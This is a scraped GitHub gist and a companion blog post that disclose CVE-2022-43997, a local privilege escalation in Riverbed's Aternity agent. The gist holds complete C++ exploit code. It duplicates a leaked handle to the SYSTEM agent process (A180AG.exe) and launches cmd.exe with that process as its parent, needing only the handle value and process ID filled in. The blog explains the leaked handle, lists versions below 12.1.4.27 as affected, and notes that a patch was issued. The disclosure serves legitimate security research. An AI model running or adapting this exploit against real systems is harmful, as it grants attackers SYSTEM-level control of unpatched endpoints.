=== Content from gist.github.com_08b74679_20250114_205151.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fjackullrich%2F21fcfe75aeb5e18c60b80e684b83d741)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fjackullrich%2F21fcfe75aeb5e18c60b80e684b83d741&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fjackullrich%2F21fcfe75aeb5e18c60b80e684b83d741) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fjackullrich%2F21fcfe75aeb5e18c60b80e684b83d741&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@jackullrich](https://avatars.githubusercontent.com/u/27821565?s=64&v=4)](/jackullrich)

# [jackullrich](/jackullrich)/**[CVE-2022-43997.cpp](/jackullrich/21fcfe75aeb5e18c60b80e684b83d741)**

Created
January 23, 2023 21:51

Show Gist options

* [Download ZIP](/jackullrich/21fcfe75aeb5e18c60b80e684b83d741/archive/e9dc4dc965188d39bba4720d21f76ce3ff1f6042.zip)

* [Star
  (1)
  1](/login?return_to=https%3A%2F%2Fgist.github.com%2Fjackullrich%2F21fcfe75aeb5e18c60b80e684b83d741)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fjackullrich%2F21fcfe75aeb5e18c60b80e684b83d741)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/jackullrich/21fcfe75aeb5e18c60b80e684b83d741.js&quot;&gt;&lt;/script&gt;
* Save jackullrich/21fcfe75aeb5e18c60b80e684b83d741 to your computer and use it in GitHub Desktop.

[Code](/jackullrich/21fcfe75aeb5e18c60b80e684b83d741)
[Revisions
1](/jackullrich/21fcfe75aeb5e18c60b80e684b83d741/revisions)
[Stars
1](/jackullrich/21fcfe75aeb5e18c60b80e684b83d741/stargazers)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/jackullrich/21fcfe75aeb5e18c60b80e684b83d741.js&quot;&gt;&lt;/script&gt;

Save jackullrich/21fcfe75aeb5e18c60b80e684b83d741 to your computer and use it in GitHub Desktop.

[Download ZIP](/jackullrich/21fcfe75aeb5e18c60b80e684b83d741/archive/e9dc4dc965188d39bba4720d21f76ce3ff1f6042.zip)

CVE-2022-43997

 [Raw](/jackullrich/21fcfe75aeb5e18c60b80e684b83d741/raw/e9dc4dc965188d39bba4720d21f76ce3ff1f6042/CVE-2022-43997.cpp)

[**CVE-2022-43997.cpp**](#file-cve-2022-43997-cpp)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | #include <memory> |
| --- | --- |
|  |  |
|  | #include <Windows.h> |
|  |  |
|  | bool CreateProcessWithParent(HANDLE hProcess, PWSTR commandline) |
|  | { |
|  | SIZE\_T size = 0; |
|  | bool result = false; |
|  | STARTUPINFOEX si = { sizeof(si) }; |
|  | PROCESS\_INFORMATION pi = { 0 }; |
|  |  |
|  | if (InitializeProcThreadAttributeList(nullptr, 1, 0, &size)) |
|  | { |
|  | auto buffer = std::make\_unique<BYTE[]>(size); |
|  |  |
|  | if (buffer != nullptr) |
|  | { |
|  | auto attributes = reinterpret\_cast<PPROC\_THREAD\_ATTRIBUTE\_LIST>(buffer.get()); |
|  |  |
|  | if (InitializeProcThreadAttributeList(attributes, 1, 0, &size)) |
|  | { |
|  | if (UpdateProcThreadAttribute(attributes, 0, |
|  | PROC\_THREAD\_ATTRIBUTE\_PARENT\_PROCESS, |
|  | &hProcess, sizeof(hProcess), nullptr, nullptr)) |
|  | { |
|  | si.lpAttributeList = attributes; |
|  | result = CreateProcessW(nullptr, commandline, nullptr, nullptr, |
|  | FALSE, EXTENDED\_STARTUPINFO\_PRESENT, nullptr, nullptr, |
|  | (STARTUPINFO\*)&si, &pi); |
|  |  |
|  | if (result) |
|  | { |
|  | CloseHandle(pi.hProcess); |
|  | CloseHandle(pi.hThread); |
|  | } |
|  |  |
|  | CloseHandle(hProcess); |
|  | DeleteProcThreadAttributeList(attributes); |
|  | } |
|  | } |
|  | } |
|  | } |
|  |  |
|  | return result; |
|  | } |
|  |  |
|  | bool DuplicateAternityHandle(HANDLE hHandleValue, DWORD dwProcessId, PHANDLE hClonedHandle) |
|  | { |
|  | bool result = false; |
|  |  |
|  | HANDLE hLocalClone = INVALID\_HANDLE\_VALUE; |
|  | HANDLE hOwnerProcess = INVALID\_HANDLE\_VALUE; |
|  |  |
|  | hOwnerProcess = OpenProcess(PROCESS\_DUP\_HANDLE, FALSE, dwProcessId); |
|  |  |
|  | if (hOwnerProcess != nullptr) |
|  | { |
|  | if (DuplicateHandle(hOwnerProcess, hHandleValue, GetCurrentProcess(), &hLocalClone, 0, FALSE, DUPLICATE\_SAME\_ACCESS)) |
|  | { |
|  | result = true; |
|  | } |
|  |  |
|  | CloseHandle(hOwnerProcess); |
|  | } |
|  |  |
|  | \*hClonedHandle = hLocalClone; |
|  |  |
|  | return result; |
|  | } |
|  |  |
|  | int main(void) |
|  | { |
|  | // |
|  | // <!--- Replace these values (handle, dwProcessId) ---> |
|  | // These can be obtained by calling NtQuerySystemInformation as well |
|  | // |
|  | // This is the A180AG.exe handle value from the medium IL process |
|  | // |
|  | HANDLE handle = INVALID\_HANDLE\_VALUE; |
|  | // |
|  | // This is the process id of the medium IL process |
|  | // |
|  | DWORD dwProcessId = 123456; |
|  |  |
|  | // Application we want to start |
|  | wchar\_t commandLine[1024] = L"C:\\Windows\\System32\\cmd.exe"; |
|  |  |
|  | HANDLE hClonedHandle = INVALID\_HANDLE\_VALUE; |
|  |  |
|  | if (DuplicateAternityHandle(handle, dwProcessId, &hClonedHandle)) |
|  | { |
|  | CreateProcessWithParent(hClonedHandle, commandLine); |
|  | } |
|  | } |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fjackullrich%2F21fcfe75aeb5e18c60b80e684b83d741)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from winternl.com_8951d55e_20250114_205152.html ===

# [winternl](https://winternl.com)

cybersecurity & programming

+ [about](https://winternl.com/about/)

* [github](https://github.com/jackullrich)
* [xitter](https://x.com/winternl_t)

Search

# CVE-2022-43997 – Local Privilege Escalation in Aternity Agent

[Jan 23, 2023](https://winternl.com/cve-2022-43997/)

—

by

[winternl](https://winternl.com/author/winternl/)

Aternity is software developed by Riverbed used to monitor the performance of applications and devices from the end user perspective. Software such as Aternity is a prime target for vulnerability research. “Monitoring” software typically installs hooks and performs process injection to track analytics. Doing so safely is not a trivial task; there may be implementation details an attacker may take advantage of. Additionally, there is incentive to install performance monitors on as many endpoints as possible for best breadth of coverage.

#### Vulnerability Overview

Vulnerable versions of the Aternity agent expose a handle to the agent process (running as SYSTEM) in processes with low and medium integrity levels.

![Aternity agent leaking handle.](http://172-236-100-146.ip.linodeusercontent.com/wp-content/uploads/2023/01/aternity-exp.png)

Some low and medium integrity processes on this endpoint were observed to leak a handle the *A180AG.exe* process with PROCESS\_ALL\_ACCESS rights assigned to the object. An attacker may subsequently duplicate the leaked handle and perform a local privilege escalation (LPE).

#### Responsible Disclosure

**Affected Versions: < 12.1.4.27**

The vulnerability was reported to Riverbed and a patch has been issued.

[Release Notes](https://help.aternity.com/en-US/bundle/release_news_agent_console_saas/page/release_news/topics/release_rn_agent_12.1.html)

##### References / Further Reading :

* <https://aptw.tf/2022/02/10/leaked-handle-hunting.html>
* <https://twitter.com/last0x00>
* <https://twitter.com/APTortellini>
* <https://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/>
* <https://twitter.com/dronesec>
* <https://scorpiosoftware.net/2021/01/10/parent-process-vs-creator-process/>
* <https://github.com/bananabr/Givemeahand>

##### Proof-of-Concept:

Available on [GitHub](https://gist.github.com/jackullrich/21fcfe75aeb5e18c60b80e684b83d741).

[CVE](https://winternl.com/tag/cve/) [LPE](https://winternl.com/tag/lpe/)

---

←[Previous:  Dealing with Failure: Failure Escalation Policy in Unmanaged CLR Hosts](https://winternl.com/dealing-with-failure/)
[Next:  Why is there a debug directory in my release build?](https://winternl.com/why-is-there-a-debug-directory-in-my-release-build/)→

---

©

[winternl](https://winternl.com)


